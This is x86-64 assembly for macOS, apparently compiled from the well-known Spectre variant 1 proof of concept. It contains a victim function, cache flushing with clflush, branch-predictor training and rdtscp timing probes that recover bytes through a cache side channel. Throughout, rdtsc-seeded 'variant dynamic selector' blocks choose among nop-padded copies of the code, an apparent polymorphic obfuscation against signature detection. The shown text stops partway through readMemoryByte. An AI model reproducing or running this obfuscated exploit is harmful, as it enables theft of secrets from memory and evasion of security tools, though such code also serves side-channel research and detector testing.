	.data
	.globl  random_selector
random_selector:
	.long   0
	.text

	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	_array1_size(%rip), %ecx
                                        ## kill: def $rcx killed $ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.Lvictim_function_win0_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.Lvictim_function_win0_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %ecx
	movzbl	_temp(%rip), %eax
	andl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _temp(%rip)
LBB0_2:
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readMemoryByte                 ## -- Begin function readMemoryByte
	.p2align	4, 0x90
_readMemoryByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	%rcx, -48(%rbp)
	movl	$0, -72(%rbp)
	movl	$0, -56(%rbp)
LBB1_1:                                 ## =>This Inner Loop Header: Depth=1
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win9_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win9_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win9_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win9_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win9_var2
	jmp	.LreadMemoryByte_win9_var0
## Variant 0
.LreadMemoryByte_win9_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 1
.LreadMemoryByte_win9_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 2
.LreadMemoryByte_win9_var2:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
.LreadMemoryByte_win9_continue:
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_1
LBB1_4:
	movl	$1999, -52(%rbp)    # # imm = 0x7CF
LBB1_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_7 Depth 2
                                        ##     Child Loop BB1_11 Depth 2
                                        ##       Child Loop BB1_13 Depth 3
                                        ##     Child Loop BB1_19 Depth 2
                                        ##     Child Loop BB1_26 Depth 2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win8_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win8_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win8_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win8_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win8_var2
	jmp	.LreadMemoryByte_win8_var0
## Variant 0
.LreadMemoryByte_win8_var0:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 1
.LreadMemoryByte_win8_var1:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 2
.LreadMemoryByte_win8_var2:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
.LreadMemoryByte_win8_continue:
LBB1_7:                                 ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win7_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win7_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win7_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win7_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win7_var2
	jmp	.LreadMemoryByte_win7_var0
## Variant 0
.LreadMemoryByte_win7_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 1
.LreadMemoryByte_win7_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 2
.LreadMemoryByte_win7_var2:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
.LreadMemoryByte_win7_continue:
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.9:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_7
LBB1_10:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	movl	%edx, %eax
                                        ## kill: def $rax killed $eax
	movq	%rax, -80(%rbp)
	movl	$59, -60(%rbp)
LBB1_11:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_13 Depth 3
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win6_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win6_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win6_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win6_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win6_var2
	jmp	.LreadMemoryByte_win6_var0
## Variant 0
.LreadMemoryByte_win6_var0:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 1
.LreadMemoryByte_win6_var1:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 2
.LreadMemoryByte_win6_var2:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
.LreadMemoryByte_win6_continue:
LBB1_13:                                ##   Parent Loop BB1_5 Depth=1
                                        ##     Parent Loop BB1_11 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	movl	-116(%rbp), %eax
	cmpl	$1000, %eax    # # imm = 0x3E8
	jge	LBB1_16
## %bb.14:                              ##   in Loop: Header=BB1_13 Depth=3
	jmp	LBB1_15
LBB1_15:                                ##   in Loop: Header=BB1_13 Depth=3
	movl	-116(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -116(%rbp)
	jmp	LBB1_13
LBB1_16:                                ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax    # # imm = 0xFFFF0000
	cltq
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rax
	movq	-88(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-80(%rbp), %rax
	movq	-88(%rbp), %rcx
	movq	-32(%rbp), %rdx
	xorq	-80(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rdi
	callq	_victim_function
## %bb.17:                              ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_11
LBB1_18:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
LBB1_19:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win5_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win5_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win5_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win5_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win5_var2
	jmp	.LreadMemoryByte_win5_var0
## Variant 0
.LreadMemoryByte_win5_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 1
.LreadMemoryByte_win5_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 2
.LreadMemoryByte_win5_var2:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
.LreadMemoryByte_win5_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -112(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, -136(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-136(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -96(%rbp)
	movq	-112(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -72(%rbp)
	leaq	-72(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, -128(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-128(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-96(%rbp), %rax
	movq	%rax, -104(%rbp)
	movq	-104(%rbp), %rax
                                        ## kill: def $eax killed $eax killed $rax
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win4_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win4_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win4_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win4_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win4_var2
	jmp	.LreadMemoryByte_win4_var0
## Variant 0
.LreadMemoryByte_win4_var0:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 1
.LreadMemoryByte_win4_var1:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 2
.LreadMemoryByte_win4_var2:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
.LreadMemoryByte_win4_continue:
	movl	-140(%rbp), %eax    # # 4-byte Reload
	movl	%edx, %ecx
	movl	%ecx, %edx
	leaq	_array1(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win3_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win3_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win3_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win3_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win3_var2
	jmp	.LreadMemoryByte_win3_var0
## Variant 0
.LreadMemoryByte_win3_var0:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 1
.LreadMemoryByte_win3_var1:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 2
.LreadMemoryByte_win3_var2:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
.LreadMemoryByte_win3_continue:
	movl	%edx, (%rax,%rcx,4)
LBB1_23:                                ##   in Loop: Header=BB1_19 Depth=2
	jmp	LBB1_24
LBB1_24:                                ##   in Loop: Header=BB1_19 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_19
LBB1_25:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$-1, -64(%rbp)
	movl	$-1, -60(%rbp)
	movl	$0, -56(%rbp)
LBB1_26:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win2_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win2_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win2_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win2_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win2_var2
	jmp	.LreadMemoryByte_win2_var0
## Variant 0
.LreadMemoryByte_win2_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 1
.LreadMemoryByte_win2_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 2
.LreadMemoryByte_win2_var2:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
.LreadMemoryByte_win2_continue:
	movl	(%rax,%rcx,4), %eax
	movslq	-60(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_30
LBB1_29:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-60(%rbp), %eax
	movl	%eax, -64(%rbp)
	movl	-56(%rbp), %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_34
LBB1_30:                                ##   in Loop: Header=BB1_26 Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win1_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win1_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win1_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win1_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win1_var2
	jmp	.LreadMemoryByte_win1_var0
## Variant 0
.LreadMemoryByte_win1_var0:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 1
.LreadMemoryByte_win1_var1:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 2
.LreadMemoryByte_win1_var2:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
.LreadMemoryByte_win1_continue:
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_33
LBB1_32:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	movl	%eax, -64(%rbp)
LBB1_33:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_34
LBB1_34:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_35
LBB1_35:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_26
LBB1_36:                                ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	movl	(%rcx,%rdx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	movl	random_selector(%rip), %eax
	testl	%eax, %eax
	jne	.LreadMemoryByte_win0_skip_init
	rdtsc
	xorq	%rdx, %rax
	movl	%eax, random_selector(%rip)
.LreadMemoryByte_win0_skip_init:
	movl	random_selector(%rip), %eax
	xorl	%edx, %edx
	movl	$3, %ecx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win0_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win0_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win0_var2
	jmp	.LreadMemoryByte_win0_var0
## Variant 0
.LreadMemoryByte_win0_var0:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 1
.LreadMemoryByte_win0_var1:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 2
.LreadMemoryByte_win0_var2:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
.LreadMemoryByte_win0_continue:
	jne	LBB1_40
## %bb.38:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$0, (%rax,%rcx,4)
	jne	LBB1_40
LBB1_39:
	jmp	LBB1_42
LBB1_40:                                ##   in Loop: Header=BB1_5 Depth=1
	jmp	LBB1_41
LBB1_41:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	LBB1_5
LBB1_42:
	movl	-60(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-64(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, 4(%rax)
	movl	-72(%rbp), %eax
	xorl	_readMemoryByte.results(%rip), %eax
	movl	%eax, _readMemoryByte.results(%rip)
